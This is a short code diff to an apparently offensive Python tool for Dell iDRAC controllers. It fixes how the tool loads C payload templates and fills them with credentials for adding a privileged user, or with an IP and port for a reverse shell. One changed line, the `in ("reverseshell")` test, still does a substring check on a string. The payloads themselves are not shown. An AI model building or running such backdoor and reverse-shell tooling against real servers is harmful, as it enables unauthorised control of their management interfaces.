@@ -225,7 +225,7 @@ class iDRAC:
 
         try:
             # Load and prepare the payload
-            CPayloadFile = os.path.join(self.payloadScripts, payload_type)
+            CPayloadFile = os.path.join(self.payloadScripts, f"{payload_type}.c")
             
             
             if not os.path.exists(CPayloadFile):
@@ -237,11 +237,11 @@ class iDRAC:
                 CPayload = f.read()
 
             # Replace variables based on payload type
-            if payload_type == "adduser" or "adduser_enterprise" or "quickpayload":
+            if payload_type in ("adduser", "adduser_enterprise", "quickpayload"):
                 CPayload = CPayload.replace("{username}", username)
                 CPayload = CPayload.replace("{password}", password)
                 CPayload = CPayload.replace("{privilege}", privilege)
-            elif payload_type == "reverseshell":
+            elif payload_type in ("reverseshell"):
                 CPayload = CPayload.replace("{ip}", reverse_ip)
                 CPayload = CPayload.replace("{port}", str(reverse_port))
 
